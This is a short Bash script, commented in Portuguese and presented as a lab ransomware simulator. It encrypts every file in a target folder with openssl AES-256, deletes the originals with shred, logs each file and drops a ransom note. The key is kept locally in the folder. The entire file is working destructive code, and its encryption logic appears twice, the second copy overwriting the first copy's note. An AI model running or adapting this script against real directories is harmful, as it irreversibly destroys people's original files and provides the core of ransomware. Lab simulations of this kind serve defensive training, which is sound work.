
#!/bin/bash
# Simulador de ransomware (Linux)
# Criptografa arquivos em /opt/vulnerable_files e gera nota de resgate
# Criptografia reversível para laboratório

TARGET_DIR="/opt/vulnerable_files"
KEY_FILE="$TARGET_DIR/.labkey"
NOTE_FILE="$TARGET_DIR/README_RESCUE.txt"
EXT=".locked"

# Gera chave se não existir
if [ ! -f "$KEY_FILE" ]; then
	openssl rand -base64 32 > "$KEY_FILE"
fi
KEY=$(cat "$KEY_FILE")

# Criptografa arquivos
for f in $(find "$TARGET_DIR" -type f ! -name "*.locked" ! -name ".labkey" ! -name "README_RESCUE.txt"); do
	openssl enc -aes-256-cbc -salt -in "$f" -out "$f$EXT" -k "$KEY"
	shred -u "$f"
	echo "Arquivo $f criptografado!" >> "$TARGET_DIR/.ransom_log"
	sleep 1
done

# Gera nota de resgate
cat <<EOF > "$NOTE_FILE"
SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!
Para restaurar, use a chave em $KEY_FILE e o script de restauração.
EOF
TARGET_DIR="/opt/vulnerable_files"
KEY_FILE="$TARGET_DIR/.labkey"
NOTE_FILE="$TARGET_DIR/README_RESCUE.txt"
EXT=".locked"
if [ ! -f "$KEY_FILE" ]; then
	openssl rand -base64 32 > "$KEY_FILE"
fi
KEY=$(cat "$KEY_FILE")
for f in $(find "$TARGET_DIR" -type f ! -name "*.locked" ! -name ".labkey" ! -name "README_RESCUE.txt"); do
	openssl enc -aes-256-cbc -salt -in "$f" -out "$f$EXT" -k "$KEY"
	shred -u "$f"
done
echo "Arquivos criptografados!" > "$NOTE_FILE"
